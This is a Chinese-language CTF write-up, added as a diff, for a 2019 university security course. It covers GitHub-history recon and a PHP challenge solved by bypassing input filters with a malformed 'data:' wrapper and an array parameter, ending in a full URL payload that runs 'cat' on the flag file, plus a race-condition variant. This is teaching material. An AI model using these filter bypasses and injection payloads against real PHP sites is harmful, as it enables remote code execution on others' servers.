@@ -1,0 +1,212 @@
+---
+title: "程式安全::HW3 Write-up"
+description: ""
+publishDate: "2019-11-21"
+category: "CTF"
+layout: "../../layouts/ArticleLayout.astro"
+---
+
+
+2019 年交大程式安全 HW3 write-up
+哈哈是我拉😎😎😎助教拉🤙🤙🤙
+
+# Unexploitable [100 point]
+
+## Recon
+
+簡單檢查一下網頁原始碼，可以發現網頁很簡單，只有 Matrix rain 特效的 javascript 還有一個檢查 konami 秘技的 k.js，
+cookie 的部分也沒有什麼好看的，來檢查一下 header 可以發現該網頁可能是架在 github 上的某個靜態網站。
+
+```sh
+$ curl -kI https://unexploitable.kaibro.tw/
+HTTP/2 200
+server: GitHub.com
+content-type: text/html; charset=utf-8
+last-modified: Thu, 17 Oct 2019 10:11:00 GMT
+etag: "5da83e34-4f2"
+access-control-allow-origin: *
+expires: Wed, 20 Nov 2019 17:32:45 GMT
+cache-control: max-age=600
+x-proxy-cache: MISS
+x-github-request-id: C7D4:5C02:1DA1BF:25B879:5DD57664
+accept-ranges: bytes
+date: Wed, 20 Nov 2019 17:22:46 GMT
+via: 1.1 varnish
+age: 0
+x-served-by: cache-hkg17931-HKG
+x-cache: MISS
+x-cache-hits: 0
+x-timer: S1574270566.811443,VS0,VE228
+vary: Accept-Encoding
+x-fastly-request-id: bc1e55a82c40be45132ceda0c55024153b3be9fb
+content-length: 1266
+```
+
+又或者是在訪問 url ，例如 https://unexploitable.kaibro.tw/test ，時可能會得到錯誤：
+
+<Image src="./unexploitable.png" alt="" />
+
+感覺 github 上應該有藏寶，嘗試先找到 repo，透過 dig 指令找到 unexploitable.kaibro.tw. 是 bucharesti.github.io. 的 CNAME：
+
+```sh
+$ dig unexploitable.kaibro.tw
+
+; <<>> DiG 9.10.6 <<>> unexploitable.kaibro.tw
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 36406
+;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 8, ADDITIONAL: 13
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;unexploitable.kaibro.tw.	IN	A
+
+;; ANSWER SECTION:
+unexploitable.kaibro.tw. 3078	IN	CNAME	bucharesti.github.io.
+bucharesti.github.io.	3078	IN	A	185.199.109.153
+bucharesti.github.io.	3078	IN	A	185.199.110.153
+bucharesti.github.io.	3078	IN	A	185.199.111.153
+bucharesti.github.io.	3078	IN	A	185.199.108.153
+```
+
+找到 repo 後可以發現目前的版本是沒有 flag 的，查看 commit 紀錄可以發現有條 commit message 是 `delete secret file`:
+
+<Image src="./unex_2.png" alt="" />
+
+可以在裡面找到 flag : `FLAG{baby_recon_dont_forget_to_look_github_page}`
+
+# Safe R/W [200 point]
+
+## Recon
+
+首先閱讀一下 source code，可以知道流程大概是：
+
+1. 根據使用者指紋建立一個 sandbox
+2. 可指定要建立的資料夾名稱 `$f`，waf 檢查不包含 `.` `/` `-` 任一字元
+3. 可指定要被 `include` 的檔案名稱 `$i`，waf 檢查不包含 `ph` 字串
+4. 可指定要往檔案 `meow` 寫入的內容 `$c`，waf 檢查長度不超過 20 bytes
+5. 刪除資料夾
+
+由於 5. 會刪除資料夾，所以我們必須要在 `@include($i);` 的時候就讓他執行 php 程式碼，或者是直接把 flag include 進來，
+但是作業有說 `open_basedir=/var/www/html/` 可以直接假設 flag 在這個資料夾之外，所以先不考慮第二條路。
+
+到這裡可以發現我們首先要解決的難點是如何通過這個檢查，讓我們可以把 `<?php` 塞進去我們要 include 的檔案來 RCE：
+
+```php
+stripos(file_get_contents($i), '<') === FALSE
+```
+
+## Exploit
+
+首先我有個大膽的想法，第一行測不到 `'<?php'`，第四行又跑出 `'<?php'` 不就洗洗睡了嗎
+
+```php
+if(isset($i) && stripos(file_get_contents($i), '<') === FALSE) {
+    echo "<div class='container'>";
+    echo "<h2>Here is your file content:</h2>";
+    @include($i);
+    echo "</div>";
+}
+```
+
+看到 `file_get_contents` 應該會想到各種 protocols 跟 wrappers，
+接下來可以透過 `php -a` 打開 php 的 interactive shell 做簡單的測試，
+php 在 defualt 的情況下對於開檔還有 include 的設置如下：
+
+```php
+phpinfo();
+...
+allow_url_fopen => On => On
+allow_url_include => Off => Off
+```
+
+一個有開一個沒開，
+也就是說我們可能可以透過 protocols/wrapper 來讓檢查的內容與實際上被呈現的內容產生不一致，
+這裡可以枚舉[各種支援的 protocols/wrapper](https://www.php.net/manual/en/wrappers.php)，
+然後既然都給 source code 了，直接整份拿下來架起來 debug 最快，這裡順手打開 error message：
+
+```php
+ini_set('display_errors','1');
+error_reporting(E_ALL);
+```
+
+假設遇到不支援（包括未開啟），預設會使用 `file://` 也就是直接當檔案讀，所以可以透過下列方式來測試是否可以利用：
+
+<Image src="./safeRW.png" alt="" />
+
+大部分的 protocols/wrapper 都需要在 config php 的時候開啟，基本上不期待遠端有打開，試下去感覺也是沒有，
+本來猜想簡單的 `http:` 跟 `http:///meow` 應該可以騙過 file_get_contents 去拿取外部資源，然後在 include 時被當作路徑，
+但會發現雖然 include 沒啟用 url 但是遇到 `data://` 跟 `http://` 還是會吐錯誤給你，
+可以發現我們的輸入不會被當作路徑，反而會是說這個 protocol 不允許然後直接爛掉
+
+```php
+Warning: include(): data:// wrapper is disabled in the server configuration by allow_url_include=0 in /var/www/html/asdfasdfasdfasdf.php on line 46
+
+Warning: include(data://meow): failed to open stream: no suitable wrapper could be found in /var/www/html/asdfasdfasdfasdf.php on line 46
+
+Warning: include(): Failed opening 'data://meow' for inclusion (include_path='.:/usr/share/php') in /var/www/html/asdfasdfasdfasdf.php on line 46
+```
+
+試到 `data://` 的時候可以看到下面有個人在 11 年前告訴你 `data:` 也是支援的，在 local 測一下 `data:`跟 `data:/meow` 的組合：
+
+```php
+Warning: file_get_contents(data:/meow): failed to open stream: rfc2397: no comma in URL in /var/www/html/asdfasdfasdfasdf.php on line 41
+```
+
+發現他會在 `file_get_contents` 時吃 warning 但是 `include`卻沒噴東西出來！！
+所以這裡可以透過有殘缺的 `data:` 形式讓 `file_get_contents` 打不開檔案導致回傳 `false` 從而通過判斷：
+
+```php
+php > $i = "zzz";
+php > var_dump(file_get_contents($i));
+
+Warning: file_get_contents(zzz): failed to open stream: No such file or directory in php shell code on line 1
+bool(false)
+php > var_dump(stripos(file_get_contents($i), '<'));
+
+Warning: file_get_contents(zzz): failed to open stream: No such file or directory in php shell code on line 1
+bool(false)
+```
+
+當然你也可以選擇透過正常的組合來通過判斷 `data:,` 跟 `data:,/meow` (`data:,/meow` 就是 plain text 的 `/meow`)：
+
+```php
+php > $i = "data:,/meow";
+php > var_dump(file_get_contents($i));
+string(5) "/meow"
+php > var_dump(stripos(file_get_contents($i), '<') );
+bool(false)
+```
+
+到這裡我們就可以 RCE 了：
+
+<Image src="./exploit.png" alt="" />
+
+當然可以用 20 byte 的 payload 就把 flag 猜出來
+但還是有點不自由，有牆就要爬一下，這邊拿上課教的東西隨便戳個:
+
+```php
+php > $c = array('ls',' -la ',' ../../../');
+php > var_dump(strlen($c) > 20);
+bool(false)
+php > file_put_contents("meow", $c);
+php > echo file_get_contents("meow");
+ls -la  ../../../
+```
+
+然後你就可以愛怎麼打怎麼打：
+
+`https://edu-ctf.csie.org:10155/?f=data%3A&i=data%3A%2Fmeow&c[]=%3C%3Fphp+echo+%60cat+../../../../../../../../../../../../../../../../../../flag_is_here%60%3B`
+
+flag: `FLAG{w3lc0me_t0_th3_PHP_W0r1d}`
+
+## Other Solution
+
+前面提到的主要思路就是：
+
+>我有個大膽的想法，第一行測不到 `'<?php'`，第四行又跑出 `'<?php'`
+
+這可以透過 race condition 來達成，
+因為一四行間讀取的時間差，還有根據相同的 ip ， useragent 我們會一直存取到同一個資料夾，
+透過多個 client 我們可以撞到幾次他檢查完我們又把內容改掉，讓已經通過檢查的 server 去 include 我們修改過的 meow。
